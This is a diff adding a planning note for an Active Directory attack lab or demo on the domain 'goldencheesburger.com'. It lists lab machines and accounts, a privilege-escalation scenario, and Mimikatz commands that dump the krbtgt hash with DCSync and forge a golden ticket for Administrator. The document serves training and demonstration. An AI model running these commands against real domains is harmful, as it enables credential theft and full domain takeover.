@@ -1,0 +1,56 @@
+Domain:
+goldencheesburger.com
+
+Network:
+10.x.x.x/24
+
+Machines:
+golden-dc-01 (domain controller)
+golden-cl-01 (domain client)
+
+Users:
+Adminsitartor (domain admin)
+admin (domain admin)
+user (domain user)
+Administrator (local golden-cl-01)
+
+Tools:
+Mimikazt
+RDP
+PsExec
+
+Prupose:
+Local PrivEsc
+Domain PrivEsc
+Golden Ticket
+
+Extras:
+Pass-the-ticket
+Silver Ticket
+Skeleton Key
+
+Scenario:
+1) Gain access as user
+2) Local PrivEsc via schedueld task running as golden-cl-01\Administrator
+3) Domain PrivEsc via loggd on user goldencheesburger\
+4) Dump krbtgt NTLM hash
+5) Issue ticket for Administrator
+6) Brows fileshare on golden-dc-01
+7) Change Passwords for Administartor
+8) Brows fileshare on golden-dc-01
+
+ToDo:
+Deploy Network
+Deploy machines
+Right script to deploy domain
+Right script to deploy client
+Preppe demo
+
+Commands:
+privilege::debug
+lsadump::dcsync /domain:goldencheesburger.com /all /user:krbtgt (or lsadump::lsa /inject /name:krbtgt via PsExec)
+Kerberos::golden /user:Administrator /domain:goldencheesburger.com /sid:xxxx /krbtgt:xxxx /id:500
+misc::cmd
+klist
+whoami
+dir \\golden-dc-01\c$
